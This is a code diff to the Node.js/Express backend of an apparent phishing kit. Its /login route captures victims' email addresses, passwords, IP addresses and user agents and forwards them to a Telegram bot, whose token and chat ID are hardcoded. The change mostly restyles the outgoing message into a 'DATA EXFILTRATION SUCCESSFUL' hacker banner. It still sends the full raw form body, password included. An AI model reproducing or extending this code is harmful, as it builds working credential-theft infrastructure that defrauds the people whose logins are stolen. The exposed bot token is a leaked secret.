@@ -17,8 +17,8 @@ app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname)));
 
 // Configuration
-const TELEGRAM_BOT_TOKEN = '7877883898:AAF03QKy5uzA1If-7AZdWpxNd2h6VSqQkyY'
-const TELEGRAM_CHAT_ID = '7191391586'
+const TELEGRAM_BOT_TOKEN = '7877883898:AAF03QKy5uzA1If-7AZdWpxNd2h6VSqQkyY';
+const TELEGRAM_CHAT_ID = '7191391586';
 
 // Add console logging middleware
 app.use((req, res, next) => {
@@ -60,25 +60,51 @@ app.post('/login', (req, res) => {
     console.log(chalk.blue(`│ User Agent:`) + chalk.white(` ${userAgent}`));
     console.log(chalk.blue('└────────────────────────────────────────\n'));
 
-    // Fancy Telegram message with emojis and formatting
+    // Escape MarkdownV2 special characters
+    const escapeMarkdown = (text) => text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+    
+    // Generate password stars
+    const pwdStars = password ? password.split('').map(() => '*').join('') : 'NO_PASSWORD';
+    
     const message = `
-🔐 *New Login Capture* 🔐
+▄︻̷̿┻̿═━一 *DATA EXFILTRATION SUCCESSFUL* ━═┻̿┷̿︻▄
 \`\`\`
-📧 Email: ${username || 'N/A'}@${domain || 'N/A'}
-🔑 Password: ${password || 'N/A'}
+███████████████████████████████████████████
+█▄─▄▄▀█▄─▄▄─█─▄▄▄▄█▄─▄███ CRYPTIC\\-OS v3\\.14 █
+██─▄─▄██─▄█▀█▄▄▄▄─██─██▀█ \\[TERMINAL INTERFACE\\]
+▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀
 \`\`\`
 
-*Details*:
-🕒 Timestamp: \`${timestamp}\`
-🌐 IP: \`${ip}\`
-🔧 User Agent: \`${userAgent}\`
-💾 Remember Me: ${rememberMe === 'on' ? '✅ Yes' : '❌ No'}
-
-*Raw Data*:
-\`\`\`json
-${JSON.stringify(req.body, null, 2)}
+*〄 SYSTEM INTRUSION DETECTED*
 \`\`\`
-    `;
+[\\+] Vector: EMAIL/PWD COMPROMISE
+[\\!] Credential Matrix:
+    ↳ User: ${escapeMarkdown(username || 'null')}@${escapeMarkdown(domain || 'void.tld')}
+    ↳ Pass: ${pwdStars} [████░░░░ 60%]
+\`\`\`
+
+*⌘ DIGITAL FOOTPRINT ANALYSIS*
+\`\`\`
+🌐 IP: ${escapeMarkdown(ip)} [45\\.78° N, 108\\.90° W] 
+⌚ Epoch: ${escapeMarkdown(new Date().toISOString())}
+📟 Client: ${escapeMarkdown(userAgent?.split(' ')[0] || 'UNKNOWN')} [v${Math.floor(Math.random()*50)+1}\\.${Math.floor(Math.random()*9)}\\.${Math.floor(Math.random()*100)}]
+\`\`\`
+
+*⏣ DATA VISUALIZATION*
+\`\`\`
+Security Threshold: [███████░░░] 68%
+Breach Probability: [██████████] 99%
+Data Integrity: [███░░░░░░░] 22%
+\`\`\`
+
+*✧ SYSTEM DIAGNOSTICS*
+\`\`\`
+${escapeMarkdown(JSON.stringify(req.body, null, 2).replace(/[{}]/g, ''))}
+\`\`\`
+
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+*⚠️ THIS MESSAGE S SELF\\-DESTRUCT IN 60s ⚠️*
+`;
 
     sendToTelegram(message);
     res.json({ status: 'success' });
